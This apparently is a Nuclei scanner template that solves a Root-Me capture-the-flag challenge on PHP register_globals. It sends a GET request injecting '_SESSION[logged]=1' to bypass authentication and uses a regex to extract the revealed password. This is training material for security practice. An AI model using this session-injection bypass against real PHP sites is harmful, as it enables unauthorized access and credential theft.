id: PHP-Registerglobals
info:
  author: Tomitom13
  name: PHP - Register globals
  severity: unknown
  tags: php,rootme
requests:
- extractors:
  - name: password
    part: body
    regex:
    - 'password : [a-zA-Z0-9!@#$%^&*()_+\-,.<>?]+'
    type: regex
  matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - 'validate with the password : '
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?_SESSION[logged]=1'
